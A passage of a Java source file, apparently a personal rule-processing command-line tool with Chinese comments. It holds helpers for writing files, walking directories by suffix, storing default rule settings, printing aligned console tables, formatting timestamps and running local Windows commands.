//                BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));
				while ((len = is.read(buff)) != -1) {
					curBW.write(buff, 0, len);
				}

				curBW.flush();
				is.close();
				curBW.close();
				System.out.println("write Byte out File OK !  File = " + file.getAbsolutePath());
			} else {
				System.out.println("write out Byte File  Failed !    File = " + file.getAbsolutePath());
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	static void writeContentToFile(File file, ArrayList<String> strList) {
		// PC 以 \r\n 结尾
		// Unix 以 \n 结尾
		// dos2unix 是在末尾把 \r 去掉 所以 文件会变小
		// unix2dos 是在文件末尾把 \n 之前加上 \r\n 所以文件会变大
//    	System.setProperty(“line.separator", "\r\n")"
		String endTagDefault = "\n"; // 默认是 Linux下的 换行符
		if (CUR_OS_TYPE == OS_TYPE.Windows) {
			endTagDefault = "\r\n"; // 如果操作系统是 Windows 那么改变换行符为 \r\n
		}
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < strList.size(); i++) {

			sb.append(strList.get(i) + endTagDefault);
		}
		try {
			if (file != null && !file.exists()) {
				file.createNewFile();
			}

			if (file != null && file.exists()) {
				BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));

				curBW.write(sb.toString());
				curBW.flush();
				curBW.close();
				System.out.println("write out File OK !  File = " + file.getAbsolutePath());
			} else {
				System.out.println("write out File  Failed !    File = " + file.getAbsolutePath());
			}
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	static String getPaddingIntString(int index, int padinglength, String oneStr, boolean dirPre) {
		String result = "" + index;
		int length = ("" + index).length();

		if (length < padinglength) {
			int distance = padinglength - length;
			for (int i = 0; i < distance; i++) {
				if (dirPre) {
					result = oneStr + result;
				} else {
					result = result + oneStr;
				}

			}

		}
		return result;

	}

	static String getPadding_WithZero_LongString(int padinglength, String oneStr) {
		String result = "";
		for (int i = 0; i < padinglength; i++) {
			result = oneStr + result;
		}
		return result;
	}

	static ArrayList<File> getAllSubFile(File dirFile, String aospPath, ArrayList<String> typeList) {
		if (typeList == null) {
			typeList = new ArrayList<String>();
			typeList.add("*");
		}
		if (aospPath == null || "".equals(aospPath)) {
			return getAllSubFile(dirFile.getAbsolutePath(), "", typeList);
		}

		return getAllSubFile(dirFile.getAbsolutePath(), aospPath, typeList);

	}

	static ArrayList<File> getAllSubFile(String rootPath, String aospItemPath, ArrayList<String> typeList) {
		ArrayList<File> allFile = new ArrayList<File>();
		Path curRootPath = Paths.get(rootPath + File.separator + aospItemPath);

		try {
			Files.walkFileTree(curRootPath, new SimpleFileVisitor<Path>() {

				@Override
				public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
					String fileString = file.toAbsolutePath().toString();
					// System.out.println("pathString = " + fileString);
					for (int i = 0; i < typeList.size(); i++) {
						String type = typeList.get(i);
						if ("*".equals(type)) { // 如果 类型是 * 那么就把 所有的 非目录文件加入列表中
							File curFile = new File(fileString);
							if (!curFile.isDirectory()) {
								allFile.add(curFile);
								break;
							}

						} else {
							if (fileString.endsWith(type)) {
								allFile.add(new File(fileString));
								break;
//                         System.out.println("file found at path: " + file.toAbsolutePath());
							}
						}
					}
					return FileVisitResult.CONTINUE;
				}
			});
		} catch (IOException e) {
			e.printStackTrace();
		}

		return allFile;

	}

	static void showNoTypeTip(int ruleIndex) {

		System.out.println("当前用户输入的 ruleIndex = " + ruleIndex + "  操作type无法检测到-它是一个int值  \n type 必须是当前 " + Cur_Bat_Name
				+ " 的 第一个输入参数中的第一个int值 ");
		System.out.println("请检查输入参数后重新执行命令!");

	}

	static void showTip(String[] args) {
		System.out.println("对Type文件内容 进行 Index 规则的处理  identy=【 Type_Index 】【 文件后缀_当前操作逻辑索引】\n");
		System.out.println("当前已实现的替换逻辑如下:\n");

		int count = 1;
		System.out.println("═══════════════════" + "使用方法列表 Begin" + "═══════════════════" + "\n");
		for (int i = 0; i < CUR_RULE_LIST.size(); i++) {
			Rule itemRule = CUR_RULE_LIST.get(i);
			String type = itemRule.file_type;
			int index = itemRule.rule_index;
			String desc = itemRule.ruleTip(type, index, Cur_Bat_Name, CUR_OS_TYPE);

			/*
			 * String itemDesc = ""; if(CUR_OS_TYPE == OS_TYPE.Windows){ itemDesc =
			 * "zrule_apply_I9.bat  "+type+"_"+index + "    [索引 "+count+"]  描述:"+desc;
			 * }else{ itemDesc = "zrule_apply_I9 "+type+"_"+index +
			 * "    [索引 "+count+"]  描述:"+desc; }
			 */
			System.out.println(desc + "\n");
			count++;
		}
		System.out.println("═══════════════════" + "使用方法列表 End " + "═══════════════════" + "\n");

		if (isFreshDefault_SelectedIndex) { // 当前输入的参数 有更新 default 的操作
			if (!"".equals(FreshDefaultInputStr)) {
				String fixedInputStr = FreshDefaultInputStr.replace("default_index_", "");
				fixedInputStr = fixedInputStr.replace(" ", "");
				if (isNumeric(fixedInputStr)) {
					int curIndex = Integer.parseInt(fixedInputStr);
					if (curIndex <= 0 || curIndex > CUR_RULE_LIST.size()) {
						System.out.println(" 当前输入的 default_index  不在已定义的规则索引序列中 当前索引参数: " + FreshDefaultInputStr);
						System.out.println(" 可选default_index 范围 [ 1 :" + CUR_RULE_LIST.size() + " ]    请检查输入的规则索引!");
					} else {

						CUR_TYPE_INDEX = curIndex;
						I9_Properties.setProperty(Default_Selected_Rule_Index_Key, "" + CUR_TYPE_INDEX);
						setProperity();
//                        System.out.println(" 设置新的 默认 Index 成功   Default_Selected_Index = "+ CUR_TYPE_INDEX );


						Properties I9_PreParam_Properties_Temp = new Properties();

						ArrayList<String>  I9_PreParam_PropValue_List_TEMP = new ArrayList<String> ();

						// 开始 检测 是否有  预制参数的输入    并且 输入的参数是 rule_开头的数据  这个 规则  一一对应
						int pre_param_count = 0;
						for (int i = 0; i < args.length; i++) {
							String preparam_item = args[i];
							//   1.必须以  ruleIdex_   2. 必须只能包含 三个段 53_ssidmod_dafafa 这样
							boolean isStartWithRuleIndx = preparam_item.startsWith(CUR_TYPE_INDEX+"_");

							String[]	 preparam = preparam_item.split("_");
							boolean is3segment = false;
							if(preparam != null && preparam.length >= 3) {  // 我擦   53_ssid_TP-LINK_4F6C90  有 四个  后面的词组包含下划线
								is3segment = true;
							}

							if(isStartWithRuleIndx && is3segment) {

								System.out.println("pre_param_"+pre_param_count+" = "+ preparam_item);

								I9_PreParam_Properties_Temp.setProperty(pre_param_count+"", "" + preparam_item);
								I9_PreParam_PropValue_List_TEMP.add(preparam_item);
								pre_param_count++;
							}

						}
						if(pre_param_count > 0 && I9_PreParam_Properties_Temp.size() > 0 ) {
							if(I9_PreParam_PropValue_List.size() > 0 ) {  // 原始 有数据了   清楚原始的数据
								I9_PreParam_Properties.clear();
								setProperity_PreParam();
							}
							I9_PreParam_PropValue_List.clear();
							I9_PreParam_PropValue_List.addAll(I9_PreParam_PropValue_List_TEMP);
							I9_PreParam_Properties = I9_PreParam_Properties_Temp;
							setProperity_PreParam();  // 更新数据
						}

					}
				} else {
					System.out.println("当前过滤出的 default_index 不为数值  请检查输入!");
				}
			} else {
				System.out.println(
						"当前 输入的 更新 default_index 的参数参数没有获取到 请重新执行!  FreshDefaultInputStr = " + FreshDefaultInputStr);

			}




		}
		System.out.println();
		System.out.println();
		System.out.println("当前默认选中的 default_index_" + CUR_TYPE_INDEX);

		String defaultSelectedStr = "【* 默认】";
		for (int i = 0; i < CUR_RULE_LIST.size(); i++) {
			Rule itemRule = CUR_RULE_LIST.get(i);
			String desc = itemRule.simpleDesc();
			String curInfoitem = " default_index_" + (i + 1) + "    "
					+ ((i + 1) == CUR_TYPE_INDEX ? defaultSelectedStr : "  ") + "  ## Desc:" + desc;
			if (!curInfoitem.contains(defaultSelectedStr)) {
				curInfoitem = curInfoitem.replace("##", "        ##");
			}
			System.out.println(Cur_Bat_Name + curInfoitem);
		}
		System.out.println();
		System.out.println("当前默认选中的 default_index_" + CUR_TYPE_INDEX);
		if(I9_PreParam_PropValue_List.size() == 0) {
			System.out.println("当前预置参数列表为空! ");
		}
		//  1.I9_PreParam_PropValue_List 从 prop 读取到 旧的  而 当前用户输入  又是新的情况   这里却打印旧的
		for (int i = 0; i < I9_PreParam_PropValue_List.size(); i++) {
			System.out.println("预置参数 pre_param["+i+"] = "+ I9_PreParam_PropValue_List.get(i));

		}

		// 显示 当前默认的 default_index=1
		// ztextrule_operation_I9.bat default_index = 1 ## Desc:
		// ztextrule_operation_I9.bat default_index=2 【* 默认】 ## Desc:
		// ztextrule_operation_I9.bat default_index= 3 ## Desc:

	}

	static int calculInputTypeIndex(String inputParams) {

		File absFile_B = new File(inputParams);
		if (absFile_B.exists() && absFile_B.isFile()) {
			First_Input_RealFile = absFile_B;
			System.out.println("inputParams  = " + inputParams + " absFilePath = " + inputParams);
			System.out.println(" First_Input_RealFile  = " + First_Input_RealFile.getAbsolutePath());
			return 0;
		}

		if (inputParams == null) {
			return 0;
		}

		String absFilePath = CUR_Dir_1_PATH + File.separator + inputParams;
		File absFile = new File(absFilePath);

//        String absFilePath_B =  inputParams;

		if (absFile.exists() && absFile.isDirectory()) {
			First_Input_Dir = absFile;
			return 0; // 如果输入的参数 和 shell目录 组成一个 存在的文件的话 那么说明 参数不是 选择 rule的参数
		}

		if (isNumeric(inputParams)) {
			return Integer.parseInt(inputParams);
		}

		if (inputParams.contains("_")) {
			String[] mTypeParamArr = inputParams.split("_");
			if (mTypeParamArr.length == 0) {
				return 0;
			}

			for (int i = 0; i < mTypeParamArr.length; i++) {
				String curPositionStr = mTypeParamArr[i];
				if (isNumeric(curPositionStr)) {
					return Integer.parseInt(curPositionStr);
				}
			}
		}

		if (First_Input_RealFile == null) {
			System.out.println("═══════温馨提示═════════");
			System.out.println("温馨提示 如果在 notepad++ F8 环境中 , First_Input_RealFile 没有取得对应的文件");
			System.out.println("可能是由于当前文件名称中含有 空格 导致 输入参数错误!");
			System.out.println("════════════════");
		}
		return 0;

	}

	static void addCurFileTypeMapItemWithKey(String keyType, File curFile) {
		if (CUR_Dir_FILETypeMap.containsKey(keyType)) {
			ArrayList<File> fileList = CUR_Dir_FILETypeMap.get(keyType);
			fileList.add(curFile);
		} else {
			ArrayList<File> fileList = new ArrayList<File>();
			fileList.add(curFile);
			CUR_Dir_FILETypeMap.put(keyType, fileList);
		}
	}

	static void initFileTypeMap(ArrayList<File> subFileList) {
		for (File curFile : subFileList) {
			String fileName = curFile.getName();
			if (!fileName.contains(".")) {
				addCurFileTypeMapItemWithKey("unknow", curFile);
			} else {
				String suffix = fileName.substring(fileName.lastIndexOf(".")).trim().toLowerCase();
				addCurFileTypeMapItemWithKey(suffix, curFile);
			}
		}

	}

	static Rule getRuleByIndex(int index) {
		for (int i = 0; i < CUR_RULE_LIST.size(); i++) {
			if (CUR_RULE_LIST.get(i).rule_index == index) {
				return CUR_RULE_LIST.get(i);
			}
		}
		return null;
	}

	static Rule getRuleByIdentify(String identify) {
		for (int i = 0; i < CUR_RULE_LIST.size(); i++) {
			if (CUR_RULE_LIST.get(i).identify.equals(identify)) {
				return CUR_RULE_LIST.get(i);
			}
		}
		return null;
	}

	// ArrayPrint ==============================Begin

	static int MAX_COUNT_CHAR_IN_ROW = 140;
	static int MAX_COUNT_CHAR_IN_ROW_DEFAULT = 140;

	static public void printArrObject(Object[] objArr, String title) {
		ArrayList<String> curPropStrArr = new ArrayList<String>();
		for (int i = 0; i < objArr.length; i++) {
			if ("".equals(objArr[i].toString())) {
				continue;
			}
			curPropStrArr.add(objArr[i].toString());
		}
		ArrayPrint(curPropStrArr, title);
	}

	public static boolean isItemLengthOver100(ArrayList<String> mStrList) {
		boolean flag = false;

		for (int i = 0; i < mStrList.size(); i++) {
			if (mStrList.get(i).length() > MAX_COUNT_CHAR_IN_ROW) {
				// System.out.println("index["+i+"] size= "+mStrList.get(i).length()+" Value:" +
				// mStrList.get(i) );
				return true;
			}
		}
		return flag;

	}

	public static ArrayList<String> makeStringGroup(String code, int maxcount) {
		ArrayList<String> fixArr = new ArrayList<String>();
		String oriStr = code.trim();
		while (oriStr.length() > maxcount) {
			String str1 = oriStr.substring(0, maxcount);
			fixArr.add(str1);
			oriStr = oriStr.substring(maxcount);
		}

		return fixArr;
	}

	public static ArrayList<String> sqlitString(String bigString, String sqlitChar) {
		ArrayList<String> fixArr = new ArrayList<String>();
		ArrayList<String> subArr = new ArrayList<String>();
		String[] strArr = bigString.trim().split(sqlitChar.trim());
		for (int i = 0; i < strArr.length; i++) {
			if (strArr[i].length() > MAX_COUNT_CHAR_IN_ROW) {
				ArrayList<String> subArrA = null;
				if (strArr[i].contains("【") && strArr[i].contains("】")) {
					subArrA = toSqlitWithhardBlock(strArr[i]);
				} else if (strArr[i].contains(";")) {
					subArrA = sqlitString(strArr[i], ";");

				} else if (strArr[i].contains("。")) {
					subArrA = sqlitString(strArr[i], "。");

				} else if (strArr[i].contains(":")) {
					subArrA = sqlitString(strArr[i], ":");
				} else if (strArr[i].contains(".")) {
					subArrA = sqlitString(strArr[i], ".");
				} else if (strArr[i].contains(" ")) {
					subArrA = sqlitString(strArr[i], " ");
				} else {
					// 对于超过最大长度 并且没有特殊字符的 每 80刀一分割 把它分割
					ArrayList<String> tempArr = makeStringGroup(strArr[i], MAX_COUNT_CHAR_IN_ROW);
					for (int j = 0; j < tempArr.size(); j++) {
						fixArr.add(tempArr.get(j));
					}

				}

				if (subArrA != null && isItemLengthOver100(subArrA)) {
					String fixSub = strArr[i].substring(0, MAX_COUNT_CHAR_IN_ROW);
					fixArr.add(fixSub);
				} else {
					if (subArrA != null) {
						for (int j = 0; j < subArrA.size(); j++) {
							fixArr.add(subArrA.get(j));
						}

					}
				}

			} else {
				fixArr.add(strArr[i]);
			}
		}
		return fixArr;
	}

	public static ArrayList<String> toSqlitWithhardBlock(String mStrList) {
		ArrayList<String> resultList = new ArrayList<String>();
		// 【】 【】,
		String mStr = mStrList.trim();

		String pre = mStr.substring(0, mStr.indexOf("【"));
		mStr = mStr.substring(mStr.indexOf("【"));
		resultList.add(pre);
		String end = "";
		if (mStr.endsWith("】")) {
			end = "";
		} else {
			end = mStr.substring(mStr.lastIndexOf("】") + 1);
		}

		mStr = mStr.substring(0, mStr.lastIndexOf("】") + 1);

		while (mStr.contains("】") && mStr.contains("【")) {
			String firstStr = mStr.substring(mStr.indexOf("【"), mStr.indexOf("】") + 1);
			resultList.add(firstStr);
			mStr = mStr.substring(mStr.indexOf("】") + 1);
		}

		if (!"".equals(mStr.trim())) {
			resultList.add(mStr.trim());
		}

		if (!"".equals(end)) {
			resultList.add(end);
		}

//        for (int i = 0; i < resultList.size(); i++) {
//            System.out.println("xxx："+i+"  ="+resultList.get(i) +"   mStr="+mStr);
//        }
		return resultList;
	}

	public static ArrayList<String> toMakeListItemLess100(ArrayList<String> mStrList, int maxcount) {
		ArrayList<String> fixLengthArr = new ArrayList<String>();

		for (int i = 0; i < mStrList.size(); i++) {
			if (mStrList.get(i).length() < MAX_COUNT_CHAR_IN_ROW) {
				fixLengthArr.add(mStrList.get(i));
			} else {
				String curMaxStr = mStrList.get(i);
				ArrayList<String> fixA = null;
				if (curMaxStr.contains("【") && curMaxStr.contains("】")) {
					fixA = toSqlitWithhardBlock(curMaxStr);
				} else if (curMaxStr.contains(";")) {
					fixA = sqlitString(curMaxStr, ";");
				} else if (curMaxStr.contains("。")) {
					fixA = sqlitString(curMaxStr, "。");
				} else if (curMaxStr.contains(":")) {
					fixA = sqlitString(curMaxStr, ":");
				} else if (curMaxStr.contains(".")) {
					fixA = sqlitString(curMaxStr, ".");
				} else if (curMaxStr.contains(" ")) {
					fixA = sqlitString(curMaxStr, " ");
				} else {
					// 对于超过最大长度 并且没有特殊字符的 每 80刀一分割 把它分割
					ArrayList<String> tempArr = makeStringGroup(curMaxStr, MAX_COUNT_CHAR_IN_ROW);
					for (int j = 0; j < tempArr.size(); j++) {
						fixLengthArr.add(tempArr.get(j));
					}
				}

				if (fixA != null) {
					// System.out.println(" fixA.size="+ fixA.size());
					for (int j = 0; j < fixA.size(); j++) {
						// System.out.println(" fixA.size="+ fixA.size() + " i="+j+"
						// value:"+fixA.get(j));
					}
				} else {
					// System.out.println(" fixA.size= null!");
				}
				if (isItemLengthOver100(fixA)) {
					String fixSub = curMaxStr.substring(0, MAX_COUNT_CHAR_IN_ROW);
					fixLengthArr.add(fixSub);
				} else {
					if (fixA != null) {
						for (int j = 0; j < fixA.size(); j++) {
							fixLengthArr.add(fixA.get(j));
						}
					}
				}

			}
		}

		return fixLengthArr;
	}

	public static int getItemMaxLength(ArrayList<String> mStrList) {
		int itemLength = 0;

		for (int i = 0; i < mStrList.size(); i++) {
			if (mStrList.get(i).length() > itemLength) {
				itemLength = mStrList.get(i).length();
			}

		}
		return itemLength;
	}

	public static ArrayList<String> fixStrArrMethodCommon100(ArrayList<String> mStrList, int maxcount) {
		ArrayList<String> fixArr = new ArrayList<String>();
		for (int i = 0; i < mStrList.size(); i++) {
			String curStr = mStrList.get(i);
			String fixCurStr = getFixLengthNewStr(curStr, maxcount);
			fixArr.add(fixCurStr);
		}

		return fixArr;
	}

	public static String getFixLengthNewStr(String oriStr, int maxLength) {
		String fixStr = "";
		String beginChar = "│ ";
		String endChar = "│";
		String oriStrTrim = oriStr.trim();
		int curLength = oriStrTrim.length();
		int paddingLength = maxLength - curLength;

		int chineseCount = getFrameChineseCount(oriStr);
		paddingLength = paddingLength - chineseCount;
		if (paddingLength < 0) {
			// return "curString:" + oriStr + " length more than" + maxLength;
			return "";
		}

		for (int i = 0; i < paddingLength; i++) {
			oriStrTrim += " ";
		}
		oriStrTrim = beginChar + oriStrTrim + endChar;
		// oriStrTrim = beginChar + oriStrTrim ;
		fixStr = oriStrTrim;
		return fixStr;
	}

	public static int getFrameChineseCount(String oriStr) {
		int count = 0;
		for (int i = 0; i < oriStr.length(); i++) {
			char itemChar = oriStr.charAt(i);
			/*
			 *
			 * || (itemChar+"").equals("，") || (itemChar+"").equals("’") ||
			 * (itemChar+"").equals("‘")
			 *
			 * || (itemChar+"").equals("；")
			 */
			if ((itemChar + "").equals("：") || (itemChar + "").equals("】") || (itemChar + "").equals("【")
					|| (itemChar + "").equals("）") || (itemChar + "").equals("（") || (itemChar + "").equals("￥")
					|| (itemChar + "").equals("—") || (itemChar + "").equals("？") || (itemChar + "").equals("，")
					|| (itemChar + "").equals("；") || (itemChar + "").equals("！") || (itemChar + "").equals("《")
					|| (itemChar + "").equals("》") || (itemChar + "").equals("。") || (itemChar + "").equals("、")) {
				count++;
				continue;
			}
			if ((itemChar + "").equals("\t")) {
				count = count + 4;
				continue;
			}

			boolean isChinese = isFrameContainChinese(itemChar + "");
			if (isChinese) {
				count++;
			}
		}
		return count;
	}

	public static boolean isFrameContainChinese(String str) {
		Pattern p = Pattern.compile("[\u4e00-\u9fa5]");
		Matcher m = p.matcher(str);
		if (m.find()) {
			return true;
		}
		return false;
	}

	public static void showTableLogCommon100(ArrayList<String> mStrList, String title) {
		int maxLength = getItemMaxLength(mStrList);
		ArrayList<String> fixStrArr = fixStrArrMethodCommon100(mStrList, MAX_COUNT_CHAR_IN_ROW);
		int chineseCount = getFrameChineseCount(title);

		String beginRow = "┌──────────────────" + title + "──────────────────┐";
		String endRow = "└──────────────────┘";
		int fixLength = 0;
		int oriLength = title.length();
		if (chineseCount == 0) { // 不包含汉字
			fixLength = oriLength;

		} else {
			if (chineseCount == oriLength) { // 全部包含汉字
				fixLength = 2 * oriLength;
			} else { // 一部分汉字 一部分英语

				fixLength = oriLength - chineseCount + (2 * chineseCount);
			}

		}
		String templateString = "┐";
		if (fixLength > 0) {
			for (int i = 0; i < fixLength; i++) {
				templateString = "─" + templateString;
			}
		}

		beginRow = beginRow.replace(templateString, "┐");
		// System.out.println(" fixStrArr.size() =" + fixStrArr.size());
		beginRow = resetBeginRowToDefaultSize(beginRow);
		System.out.println(beginRow);
		for (int i = 0; i < fixStrArr.size(); i++) {
			System.out.println(fixStrArr.get(i));
		}
		endRow = resetEndRowToDefaultSize(endRow);
		System.out.println(endRow);
	}

	static String resetEndRowToDefaultSize(String beginRow) {
		String curBeginStr = new String(beginRow);
		int curPaddingLength = getFramePaddingChineseLength(curBeginStr);
		int distance = 0;
		if (curPaddingLength < MAX_COUNT_CHAR_IN_ROW) {
			distance = MAX_COUNT_CHAR_IN_ROW - curPaddingLength;
		}
		String paddingString = getRepeatString("─", distance + 3);
		curBeginStr = curBeginStr.replace("┘", paddingString + "┘");
		return curBeginStr;
	}

	public static int getFramePaddingChineseLength(String oriStr) {
		int resultLength = 0;
		int oriSize = oriStr.length();
		int chinseSize = getFrameChineseCount(oriStr); // 所有中文的个数
		int distanceSize = oriSize - chinseSize; // 所有英文的个数
		resultLength = chinseSize * 2 + distanceSize;
		return resultLength;

	}

	static String getRepeatString(String repeatSrc, int repeatCount) {
		String src = "";
		for (int i = 0; i < repeatCount; i++) {
			src += repeatSrc;
		}
		return src;
	}

	static String resetBeginRowToDefaultSize(String beginRow) {
		String curBeginStr = new String(beginRow);
		int curPaddingLength = getFramePaddingChineseLength(curBeginStr);
		int distance = 0;
		if (curPaddingLength < MAX_COUNT_CHAR_IN_ROW) {
			distance = MAX_COUNT_CHAR_IN_ROW - curPaddingLength;
		}
		String paddingString = getRepeatString("─", distance + 3);
		curBeginStr = curBeginStr.replace("┐", paddingString + "┐");
		return curBeginStr;
	}

	public static void ArrayPrint(ArrayList<String> mStrList, String title) {

		ArrayList<String> addMao = CheckAndAddMaoMethod(mStrList);
		// 对mStrList 进行 对其处理 重新转换为 对其的 ArrayList<String> new
		// 1. 判断所有字符串中 第一次出现冒号的位置 查找出最大的位置的那个 并 记录这个最大位置 xMaxLengh
		// 2. 重新排序的规则是 小字符串需要在: 之后添加 xMaxLengh - self().length 的空格 并重新加入新的数组
		ArrayList<String> firstFixedStringArrA = firstFixedStringArr(addMao);
		boolean isOver100 = isItemLengthOver100(firstFixedStringArrA);

		if (isOver100) {
			// System.out.println("当前的字符串Item 存在大于 100字符的！");
			ArrayList<String> newLessList = toMakeListItemLess100(firstFixedStringArrA, MAX_COUNT_CHAR_IN_ROW);
			showTableLogCommon100(newLessList, title); // 每一行都小于100个字的打印
		} else { //
			// System.out.println("当前的字符串Item 不 存在大于 100字符的！");
			showTableLogCommon100(firstFixedStringArrA, title); // 每一行都小于100个字的打印

		}
	}

	public static String getEmptyString(int length) {
		String str = "";
		for (int i = 0; i < length; i++) {
			str += " ";
		}
		return str;
	}

	public static String getPaddingEmptyString(int length) {
		String str = "";
		for (int i = 0; i < length; i++) {
			str += "-";
		}
		return str;
	}

	// 加载库时搜索的路径列表AC-:\Program Files\Java\jdk1.8.0_191\bin
	// 加载库时搜索的路径列表A-:C\Program Files\Java\jdk1.8.0_191\bin
	public static String addMaoChinese(String oriStr) {
		String resultStr = "";
		int chinesePosition = getFirstChinesePosition(oriStr);
		resultStr = oriStr.substring(0, chinesePosition) + ":" + oriStr.substring(chinesePosition);
		return resultStr;
	}

	public static int getFirstChinesePosition(String str) {
		int position = 0;
		boolean getFirstChinese = false;
		char[] newChar = str.toCharArray(); // 转为单个字符
		for (int i = 0; i < newChar.length; i++) {
			char curChar = newChar[i];
			Pattern p = Pattern.compile("[\u4e00-\u9fa5]");
			Matcher m = p.matcher(curChar + "");
			if (m.find()) {
				getFirstChinese = true;
				position = i;
			} else {
				if (getFirstChinese == true) {
					return i;
				}
			}

		}
		return position;
	}

	public static String addMaoBlank(String oriStr) {
		String resultStr = "";
		int blankPosition = oriStr.indexOf(" ");
		resultStr = oriStr.substring(0, blankPosition) + ":" + oriStr.substring(blankPosition);
		return resultStr;
	}

	public static ArrayList<String> CheckAndAddMaoMethod(ArrayList<String> mStrList) {
		ArrayList<String> fixedArr = new ArrayList<String>();
		for (int i = 0; i < mStrList.size(); i++) {
			String curItem = mStrList.get(i);
			if (isCommonMao(curItem)) {
				fixedArr.add(curItem);
			} else {
				// 对于那些没有冒号的 字段的处理
				// 1.如果包含汉字 那么就在 汉字的最后添加一个冒号
				// 2. 如果字符串中有空格 并且第一个空格的位置小于 (MAX_COUNT_CHAR_IN_ROW/2) 那么把它换成冒号
				if (isFrameContainChinese(curItem)) {
					String addMaoStr = addMaoChinese(curItem);
					fixedArr.add(addMaoStr);
				} else if (curItem.contains(" ") && curItem.indexOf(" ") < (MAX_COUNT_CHAR_IN_ROW / 2)) {
					String addMaoStr = addMaoBlank(curItem);
					fixedArr.add(addMaoStr);
				} else { // 如果以上条件都不满足 那么就在字符串最前面添加一个冒号

					fixedArr.add(":" + curItem);

				}

			}

		}
		return fixedArr;
	}

	// 存在冒号 并且 冒号的位置小于 总的一行字数的一半长度 返回true
	public static boolean isCommonMao(String oriStr) {
		boolean flag = false;
		if (oriStr.contains(":") && oriStr.indexOf(":") == oriStr.lastIndexOf(":")) {
			flag = true; // 只有一个冒号
		} else if (oriStr.contains(":") && oriStr.contains(":\\") && oriStr.indexOf(":") < oriStr.indexOf(":\\")
				&& oriStr.indexOf(":") < (MAX_COUNT_CHAR_IN_ROW / 2)) {
			flag = true; // 多个冒号 并且 第一个冒号 : 在 :\ 之前
		} else if (oriStr.contains(":") && !oriStr.contains(":\\") && oriStr.indexOf(":") < oriStr.lastIndexOf(":")) {
			flag = true; // 多个冒号
		}
		return flag;
	}

	public static ArrayList<String> firstFixedStringArr(ArrayList<String> mStrList) {
		ArrayList<String> fixedArr = new ArrayList<String>();
		int maxMaoPosition = getMaxMaoPosition(mStrList);
		for (int i = 0; i < mStrList.size(); i++) {
			String curItem = mStrList.get(i);
			int curMaoPosition = curItem.indexOf(":");
			String pre = curItem.substring(0, curMaoPosition);
			String end = curItem.substring(curMaoPosition); // 去掉:
			int preLength = getFramePaddingChineseLength(pre); // 中文对齐 取中文长度
			// 需要达到一样的ChineseLength
			// int padding_chinese = getFrameChineseCount(pre);
			String padding = "";
			if (preLength <= maxMaoPosition) {
				int paddingLength = maxMaoPosition - preLength;
				padding = getPaddingEmptyString(paddingLength);
			}
			String fixedItem = pre + padding + end;
			fixedArr.add(fixedItem);

		}
		return fixedArr;
	}

	public static int getMaxMaoPosition(ArrayList<String> mStrList) {
		int maoPosition = 0;
		String maxString = "";
		for (int i = 0; i < mStrList.size(); i++) {
			if ((mStrList.get(i).contains(":"))) {
				int curMaoPosition = mStrList.get(i).indexOf(":");
				String maoString = mStrList.get(i).substring(0, curMaoPosition + 1);
				int paddingSize = getFramePaddingChineseLength(maoString);
				if (paddingSize > maoPosition) {
					maoPosition = paddingSize;
					maxString = mStrList.get(i);
				}
			}

		}
		// System.out.println("最长的冒号位置: maoPosition="+maoPosition+" string="+maxString);
		return maoPosition;
	}
	// ArrayPrint ==============================End

	public static String execCMD(String command) {
//        System.out.println("══════════════Begin ExE ");
		StringBuilder sb = new StringBuilder();
		StringBuilder errorSb = new StringBuilder();
		try {

//            Process process = Runtime.getRuntime().exec("CMD.exe /c start  " + command);
			Process process = Runtime.getRuntime().exec("CMD.exe /c start /B " + command);

			InputStreamReader inputReader = new InputStreamReader(process.getInputStream(), "GBK");
			BufferedReader bufferedReader = new BufferedReader(inputReader);
			String line;
			int waitFor = process.waitFor();
//            Stream<String> lines = bufferedReader.lines();
//            lines.iterator();
//            System.out.println("line Count = "+lines.count());

			while ((line = bufferedReader.readLine()) != null) {
				sb.append(line + "\n");

			}

			boolean isAlive = process.isAlive();
			int errorSteamCode = process.getErrorStream().read();

			String errorStream = process.getErrorStream().toString();
			int exitValue = process.exitValue();
//            process.getErrorStream().
			// 杀掉进程
//            System.out.println("exitValue ="+ exitValue);
			sb.append("\nexitValue = " + exitValue + "\nisAlive = " + isAlive + "\nerrorStream = " + errorStream
					+ "\nerrorSteamCode = " + errorSteamCode + "\nwaitFor = " + waitFor);
//            process.destroy();

		} catch (Exception e) {
			System.out.println("execCMD 出现异常! ");
			sb.append("execCMD 出现异常! ");
			return sb.toString();
		}

//        System.out.println("sb.toString() = "+ sb.toString());
//        System.out.println("══════════════End ExE ");
		return sb.toString();
	}

	static String getTimeStamp_yyyyMMdd_HHmmss() {

		SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd_HHmmss");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static String getTimeStamp() {

		SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd_HHmmss");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static String getTimeStampHHmmss() {

		SimpleDateFormat df = new SimpleDateFormat("HHmmss");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static String getTimeStampMMdd() {

		SimpleDateFormat df = new SimpleDateFormat("MMdd");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static String getTimeStampLong() {

		SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd_HHmmss_SSS");// 设置日期格式
		String date = df.format(new Date());
		return date;
	}

	static File getDirNewestFileWithPointTypeList(File dirFile, ArrayList<String> typeList) {
		File newImageFile = null;

		long max_time = 0;
		File[] allSubFileList = dirFile.listFiles();
		for (int i = 0; i < allSubFileList.length; i++) {
			File fileItem = allSubFileList[i];
			String type = getFileTypeWithPoint(fileItem).toLowerCase();
			if (typeList == null || typeList.contains(type)) {
				long mFileTimeStamp = getFileCreateTime(fileItem.getAbsolutePath());
				if (mFileTimeStamp > max_time) {
					max_time = mFileTimeStamp;
					newImageFile = fileItem;
				}
			}
		}

		return newImageFile;
	}

	static Long getFileCreateTime(File fileItem) {
		if (fileItem == null || !fileItem.exists()) {
			return 0L;
		}
		try {
			Path path = Paths.get(fileItem.getAbsolutePath());
			BasicFileAttributeView basicview = Files.getFileAttributeView(path, BasicFileAttributeView.class,
					LinkOption.NOFOLLOW_LINKS);
